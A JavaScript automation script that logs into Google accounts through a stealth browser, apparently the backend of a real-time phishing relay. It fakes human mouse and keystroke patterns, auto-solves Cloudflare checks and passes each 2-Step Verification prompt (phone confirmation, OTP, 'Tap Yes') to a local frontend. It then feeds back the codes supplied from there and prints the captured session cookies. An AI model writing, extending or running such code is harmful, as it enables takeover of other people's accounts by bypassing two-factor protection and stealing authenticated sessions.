const { connect } = require('brave-real-browser');
//import {connect } from 'brave-real-browser'

function waitForOTP() {
  return new Promise((resolve) => {
    console.log("⏳ Waiting for OTP from frontend...");

    process.stdin.once("data", (data) => {
      const otp = data.toString().trim();
      console.log("✅ OTP received:", otp);
      resolve(otp);
    });
  });
}

async function humanType(page, element, text) {
  await element.focus();
  for (const char of text) {
    await page.keyboard.type(char, { delay: rand(70, 180) });
  }
}


async function checkVisibility(page, textRegex) {
  // get all candidate divs
  const elements = await page.$$('div.dMNVAe');

  const regex = new RegExp(textRegex, 'i');

  for (const el of elements) {
    const text = await page.evaluate(e => e.innerText, el);
    if (regex.test(text)) {
      const box = await el.boundingBox();
      return box !== null;   // visible if it has layout
    }
  }

  return false;
}


function rand(min, max) {
  return Math.random() * (max - min) + min;
}

async function humanMouseMove(page, element) {
  const box = await element.boundingBox();
  if (!box) return;

  const startX = rand(0, box.x);
  const startY = rand(0, box.y);
  const endX = box.x + box.width / 2;
  const endY = box.y + box.height / 2;

  await page.mouse.move(startX, startY);

  const steps = Math.floor(rand(15, 30));
  for (let i = 0; i <= steps; i++) {
    const x = startX + ((endX - startX) * i) / steps;
    const y = startY + ((endY - startY) * i) / steps;
    await page.mouse.move(x, y);
    //await page.waitForTimeout(rand(12, 27));
    await new Promise(resolve => setTimeout(resolve, rand(12, 27)));
  }
}

async function f(){


const [,, email, password] = process.argv;
console.log("Email:", email);
console.log("Password:", password);

const { browser, page } = await connect({
  headless: false,
  turnstile: true  // Auto-solve Cloudflare
});

try{
  //await page.goto('https://accounts.google.com');
  await page.goto('https://accounts.google.com', { waitUntil: 'networkidle0' });
  //const emailInput = page.getByLabel('Email or phone');
  //const nextEmail = page.getByRole('button', { name: 'Next' });
  //const emailInput = await page.waitForSelector('aria/Email or phone');
  const emailInput = await page.$('#identifierId');
  const nextEmail = await page.waitForSelector('aria/Next');

  await humanMouseMove(page, emailInput);
  await emailInput.click()
  await new Promise(r => setTimeout(r, rand(300, 600)));
  await humanType(page, emailInput, email);
  //await page.keyboard.type(email, { delay: rand(90, 190) });
  //await page.type(selector, email, { delay: rand(90, 190) });
  await humanMouseMove(page, nextEmail);
  await nextEmail.click();
  console.log("Email entry over")
  //await page.waitForTimeout(rand(1000, 2000));
  await new Promise(resolve => setTimeout(resolve, rand(1000, 2000)));

  const passInput = await page.waitForSelector('aria/Enter your password', { visible: true, timeout: 15000 });
  //const passInput = await page.waitForSelector('aria/Enter your password');
  const nextPassword = await page.waitForSelector('aria/Next');
  await humanMouseMove(page, passInput);
  await passInput.click();
  await new Promise(r => setTimeout(r, rand(400, 800))); // Human "thinking" time
  await humanType(page, passInput, password);
  //await page.keyboard.type(password, { delay: rand(100, 180) });
  //await page.type(selector, password, { delay: rand(90, 190) });
  //await page.waitForTimeout(rand(500, 1000));
  await humanMouseMove(page, nextPassword);
  await nextPassword.click();
  //await page.waitForTimeout(rand(1000, 2000));
  await new Promise(resolve => setTimeout(resolve, rand(1000, 2000)));
  //await page.waitForLoadState('networkidle');
  await page.waitForNetworkIdle({ idleTime: 500, timeout: 30000 });
  console.log("Password entry over")
}catch(e){
  console.log(e)
}


try{
  let flag = 0
  /*await page.locator('text="2-Step Verification"').first().waitFor({
    timeout: 15000
  });*/
  //await page.waitForSelector('aria/2-Step Verification', { timeout: 15000 });
  //await page.waitForXPath("//*[contains(text(), '2-Step Verification')]", { timeout: 15000 });
  // Modern Replacement
  await page.waitForSelector("xpath///div[contains(text(), '2-Step Verification')]", { 
    timeout: 15000,
    visible: true // so as not to click a hidden element
  });
  /*if(await page.locator('div.dMNVAe', { hasText: /first confirm the phone number/i }).first().isVisible()) {
      console.log("flag = 1")
      flag = 1;
  }else if(await page.locator('div.dMNVAe', { hasText: /Tap Yes on the notification/i }).first().isVisible()) {
      console.log("flag = 2")
      flag = 2;
  }else{
      console.log("nothing happened")
  }*/
  if (await checkVisibility(page, "first confirm the phone number")) {
      console.log("flag = 1");
      flag = 1;
  } else if (await checkVisibility(page, "Tap Yes on the notification")) {
      console.log("flag = 2");
      flag = 2;
  } else {
      console.log("nothing happened");
  }

  if(flag == 1){
      console.log("🔐 Phone no based 2FA detected");
      await fetch("http://localhost:3005/notify/phonenumber_google", { method: "POST" });
      
      const phone_no = await waitForOTP();
      //const phoneInput = page.getByLabel('Phone number');
      const phoneInput = await page.$('#phoneNumberId');
      //const nextPhonenumber = page.getByRole('button', { name: 'Send' });
      const nextPhonenumber = await page.waitForSelector('aria/Send');
      await humanMouseMove(page, phoneInput);
      await phoneInput.click();
      //await page.keyboard.type(phone_no, { delay: rand(100, 180) });
      await humanType(page, phoneInput, phone_no);
      //await page.waitForTimeout(rand(500, 1000));
      await new Promise(resolve => setTimeout(resolve, rand(500, 1000)));
      await humanMouseMove(page, nextPhonenumber);
      await nextPhonenumber.click();
      //await page.waitForTimeout(rand(1000, 2000));
      await new Promise(resolve => setTimeout(resolve, rand(1000, 2000)));
      //await page.waitForLoadState('networkidle');
      console.log("Phone entry over")

      try{
        /*await page.locator('text=2-Step Verification').first().waitFor({
            timeout: 15000
        });*/
        await page.waitForSelector("xpath///div[contains(text(), '2-Step Verification')]", { 
          timeout: 15000,
          visible: true 
        });
        await fetch("http://localhost:3005/notify/otp_google", { method: "POST" });

        const otp = await waitForOTP()
        const otpInput = await page.$('#idvPin');
        //const nextOtp = page.getByRole('button', { name: 'Next' });
        const nextOtp = await page.waitForSelector('aria/Next');
        await humanMouseMove(page, otpInput);
        await otpInput.click();
        //await page.keyboard.type(otp, { delay: rand(100, 180) });
        await humanType(page, otpInput, otp);
        //await page.waitForTimeout(rand(500, 1000));
        await new Promise(resolve => setTimeout(resolve, rand(500, 1000)));
        await humanMouseMove(page, nextOtp);
        await nextOtp.click();
        //await page.waitForTimeout(rand(2000, 3000));
        await new Promise(resolve => setTimeout(resolve, rand(2000, 3000)));
        //await page.screenshot({ path: 'stealth4.png', fullPage: true })
        //await page.waitForLoadState('networkidle');

        const oldUrl = page.url();
        await page.waitForFunction(
          url => location.href !== url,
          {},
          oldUrl
        );

        console.log("OTP entry over")
        const context = page.browserContext();
        const cookies = await context.cookies();
        console.log(cookies);
        /*const context = page.context();
        const cookies = await context.cookies();
        console.log(cookies);*/
        await fetch("http://localhost:3005/notify/login_google_success", {
          method: "POST"
        });

      }catch(e){
        console.log(e)
      }

  }else if(flag == 2){

      /*const bodyText = await page.textContent('body');
      const match = bodyText.match(
        /Google sent a notification to your\s+(.+?)\.\s*Tap Yes on the notification/i
      );
      let phoneName = null;
      if (match) {
        phoneName = match[1].trim();
        //await page.screenshot({ path: 'stealth3.png', fullPage: true })
      }*/
     // 1. Extract the text from the body
      const bodyText = await page.evaluate(() => document.body.innerText);
      // 2. Perform the regex match (This remains the same logic-wise)
      const match = bodyText.match(
        /Google sent a notification to your\s+(.+?)\.\s*Tap Yes on the notification/i
      );
      let phoneName = null;
      if (match) {
        phoneName = match[1].trim();
        console.log(`Detected Phone: ${phoneName}`);
        // await page.screenshot({ path: 'stealth3.png', fullPage: true });
      } else {
        console.log("No phone notification match found.");
      }
      if (phoneName) {
        await fetch("http://localhost:3005/notify/tapyes_google", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            phone: phoneName
          })
        });
      }else{
        await fetch("http://localhost:3005/notify/tapyes_google", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            phone: "phone"
          })
        });
      }

      //await page.waitForLoadState('networkidle');
      //await waitForNav;
      //await page.waitForNetworkIdle({ idleTime: 500, timeout: 30000 });
      const oldUrl = page.url();
      await page.waitForFunction(
        url => location.href !== url,
        {},
        oldUrl
      );

      console.log("Tap yes over")
      const context = page.browserContext();
      const cookies = await context.cookies();
      //const cookies = await page.cookies();
      console.log(cookies);
      //await page.screenshot({ path: 'stealth3.png', fullPage: true })
      await fetch("http://localhost:3005/notify/login_google_success", {
          method: "POST"
      });
    }
      // After sending Tap-Yes notification
      /*await Promise.race([
        page.waitForURL(url => url.toString().startsWith("https://myaccount.google.com"), { timeout: 60000 }),
        page.waitForSelector('text="2-Step Verification"', { timeout: 60000 })
      ]);

      if (page.url().startsWith("https://myaccount.google.com")) {
        await fetch("http://localhost:3005/notify/login_google_success", {
          method: "POST"
        });
      }*/

      //await fetch("http://localhost:3005/notify/tapyes_google", { method: "POST" });
}catch(e){
      console.log(e)
    }
  }
  f()
/*const { chromium } = require('playwright-extra')
const readline = require('readline');

const stealth = require('puppeteer-extra-plugin-stealth')()

chromium.use(stealth)*/

/*function readFromStdin(promptText) {
  return new Promise((resolve) => {
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout,
    });

    rl.question(promptText, (answer) => {
      rl.close();
      resolve(answer.trim());
    });
  });
}*/



// That's it, the rest is playwright usage as normal 😊
/*chromium.launch({ headless: true }).then(async browser => {
  const page = await browser.newPage()

  console.log('Testing the stealth plugin..')
  await page.goto('https://accounts.google.com', { waitUntil: 'domcontentloaded' })
  await page.screenshot({ path: 'stealth.png', fullPage: true })
  //await page.waitForTimeout(30000000);




  const emailInput = page.getByLabel('Email or phone');
  const nextEmail = page.getByRole('button', { name: 'Next' });
  await humanMouseMove(page, emailInput);
  await emailInput.click();
  await page.keyboard.type(email, { delay: rand(90, 190) });
  //await page.waitForTimeout(rand(300, 700));
  await humanMouseMove(page, nextEmail);
  await nextEmail.click();
  await page.waitForTimeout(rand(1000, 2000));
  await page.screenshot({ path: 'stealth1.png', fullPage: true })
  console.log("Email entry over")
  await page.waitForTimeout(rand(300, 700));
  


  const passInput = page.getByLabel('Enter your password');
  const nextPassword = page.getByRole('button', { name: 'Next' });
  await humanMouseMove(page, passInput);
  await passInput.click();
  await page.keyboard.type(password, { delay: rand(100, 180) });
  await page.waitForTimeout(rand(500, 1000));
  await humanMouseMove(page, nextPassword);
  await nextPassword.click();
  await page.waitForTimeout(rand(1000, 2000));
  await page.screenshot({ path: 'stealth2.png', fullPage: true })
  await page.waitForLoadState('networkidle');
  console.log("Password entry over")

  try{
    let flag = 0
    await page.locator('text="2-Step Verification"').first().waitFor({
      timeout: 15000
    });

    if(await page.locator('div.dMNVAe', { hasText: /first confirm the phone number/i }).first().isVisible()) {
      console.log("flag = 1")
      flag = 1;
    }else if(await page.locator('div.dMNVAe', { hasText: /Tap Yes on the notification/i }).first().isVisible()) {
      console.log("flag = 2")
      flag = 2;
    }else{
      console.log("nothing happened")
    }

    if(flag == 1){
      console.log("🔐 Phone no based 2FA detected");
      await fetch("http://localhost:3005/notify/phonenumber_google", { method: "POST" });
      
      const phone_no = await waitForOTP();
      const phoneInput = page.getByLabel('Phone number');
      const nextPhonenumber = page.getByRole('button', { name: 'Send' });
      await humanMouseMove(page, phoneInput);
      await phoneInput.click();
      await page.keyboard.type(phone_no, { delay: rand(100, 180) });
      await page.waitForTimeout(rand(500, 1000));
      await humanMouseMove(page, nextPhonenumber);
      await nextPhonenumber.click();
      await page.waitForTimeout(rand(1000, 2000));
      await page.screenshot({ path: 'stealth3.png', fullPage: true })
      await page.waitForLoadState('networkidle');
      console.log("Phone entry over")

      try{
        await page.locator('text=2-Step Verification').first().waitFor({
            timeout: 15000
        });
        await fetch("http://localhost:3005/notify/otp_google", { method: "POST" });

        const otp = await waitForOTP()
        const otpInput = page.getByLabel('Enter the code');
        const nextOtp = page.getByRole('button', { name: 'Next' });
        await humanMouseMove(page, otpInput);
        await otpInput.click();
        await page.keyboard.type(otp, { delay: rand(100, 180) });
        await page.waitForTimeout(rand(500, 1000));
        await humanMouseMove(page, nextOtp);
        await nextOtp.click();
        await page.waitForTimeout(rand(2000, 3000));
        await page.screenshot({ path: 'stealth4.png', fullPage: true })
        await page.waitForLoadState('networkidle');
        console.log("OTP entry over")
        const context = page.context();
        const cookies = await context.cookies();
        console.log(cookies);

      }catch(e){
        console.log(e)
      }

    }else if(flag == 2){

      const bodyText = await page.textContent('body');
      const match = bodyText.match(
        /Google sent a notification to your\s+(.+?)\.\s*Tap Yes on the notification/i
      );
      let phoneName = null;
      if (match) {
        phoneName = match[1].trim();
        await page.screenshot({ path: 'stealth3.png', fullPage: true })
      }
      if (phoneName) {
        await fetch("http://localhost:3005/notify/tapyes_google", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            phone: phoneName
          })
        });
      }else{
        await fetch("http://localhost:3005/notify/tapyes_google", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            phone: "phone"
          })
        });
      }

      await page.waitForLoadState('networkidle');
      await waitForNav;
      console.log("OTP entry over")
      const context = page.context();
      const cookies = await context.cookies();
      console.log(cookies);
      await page.screenshot({ path: 'stealth3.png', fullPage: true })
      await fetch("http://localhost:3005/notify/login_google_success", {
          method: "POST"
      });

      // After sending Tap-Yes notification


      //await fetch("http://localhost:3005/notify/tapyes_google", { method: "POST" });
    }

  }catch(e){
    console.log(e)
  }
  

})*/